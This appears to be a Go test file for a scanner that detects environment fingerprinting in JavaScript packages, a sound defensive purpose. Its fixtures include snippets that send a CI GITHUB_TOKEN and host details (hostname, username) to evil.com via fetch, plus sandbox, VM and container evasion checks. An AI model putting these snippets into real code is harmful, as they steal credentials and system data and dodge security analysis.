package analyzer

import (
	"strings"
	"testing"
)

func TestEnvFingerprintAnalyzer_CIDetection(t *testing.T) {
	a := NewEnvFingerprintAnalyzer()
	content := `
if (process.env.CI || process.env.GITHUB_ACTIONS || process.env.JENKINS_URL) {
	const token = process.env.GITHUB_TOKEN;
	fetch('https://evil.com/tokens', {body: token});
}
`
	findings := a.scanContent(content, "ci_check.js")

	found := false
	for _, f := range findings {
		if strings.Contains(f.Title, "CI") || strings.Contains(f.Title, "environment fingerprint") {
			found = true
			break
		}
	}
	if !found {
		t.Error("Expected to detect CI/CD environment fingerprinting")
	}
}

func TestEnvFingerprintAnalyzer_CloudMetadata(t *testing.T) {
	a := NewEnvFingerprintAnalyzer()
	content := `
const isAWS = !!process.env.AWS_LAMBDA_FUNCTION_NAME;
const isGCP = !!process.env.GOOGLE_CLOUD_PROJECT;
if (isAWS || isGCP) { exfiltrate(); }
`
	findings := a.scanContent(content, "cloud.js")

	found := false
	for _, f := range findings {
		if strings.Contains(f.Title, "Cloud") || strings.Contains(f.Title, "cloud") {
			found = true
			break
		}
	}
	if !found {
		t.Error("Expected to detect cloud environment fingerprinting")
	}
}

func TestEnvFingerprintAnalyzer_VMDetection(t *testing.T) {
	a := NewEnvFingerprintAnalyzer()
	content := `
const os = require('os');
const cpus = os.cpus();
if (cpus.length <= 1 || os.totalmem() < 2147483648) {
	process.exit(0); // likely VM or sandbox, abort
}
`
	findings := a.scanContent(content, "vm_check.js")

	found := false
	for _, f := range findings {
		if strings.Contains(f.Title, "VM") || strings.Contains(f.Title, "sandbox") || strings.Contains(f.Title, "virtual") {
			found = true
			break
		}
	}
	if !found {
		t.Error("Expected to detect VM/sandbox detection")
	}
}

func TestEnvFingerprintAnalyzer_ContainerDetection(t *testing.T) {
	a := NewEnvFingerprintAnalyzer()
	content := `
const fs = require('fs');
const isDocker = fs.existsSync('/.dockerenv');
const cgroup = fs.readFileSync('/proc/1/cgroup', 'utf8');
if (cgroup.includes('docker') || isDocker) { return; }
`
	findings := a.scanContent(content, "docker_check.js")

	found := false
	for _, f := range findings {
		if strings.Contains(f.Title, "Container") || strings.Contains(f.Title, "container") || strings.Contains(f.Title, "Docker") {
			found = true
			break
		}
	}
	if !found {
		t.Error("Expected to detect container environment detection")
	}
}

func TestEnvFingerprintAnalyzer_OSFingerprinting(t *testing.T) {
	a := NewEnvFingerprintAnalyzer()
	content := `
const platform = os.platform();
const arch = os.arch();
const hostname = os.hostname();
const username = os.userInfo().username;
const networkInterfaces = os.networkInterfaces();
fetch('https://evil.com/fingerprint', {body: JSON.stringify({platform, arch, hostname, username})});
`
	findings := a.scanContent(content, "os_fingerprint.js")

	found := false
	for _, f := range findings {
		if strings.Contains(f.Title, "fingerprint") || strings.Contains(f.Title, "Fingerprint") || strings.Contains(f.Title, "system recon") {
			found = true
			break
		}
	}
	if !found {
		t.Error("Expected to detect OS fingerprinting")
	}
}

func TestEnvFingerprintAnalyzer_CleanCode(t *testing.T) {
	a := NewEnvFingerprintAnalyzer()
	content := `
const express = require('express');
const port = process.env.PORT || 3000;
app.listen(port);
`
	findings := a.scanContent(content, "clean.js")

	for _, f := range findings {
		if f.Severity >= SeverityHigh {
			t.Errorf("Unexpected high severity in clean code: %s", f.Title)
		}
	}
}
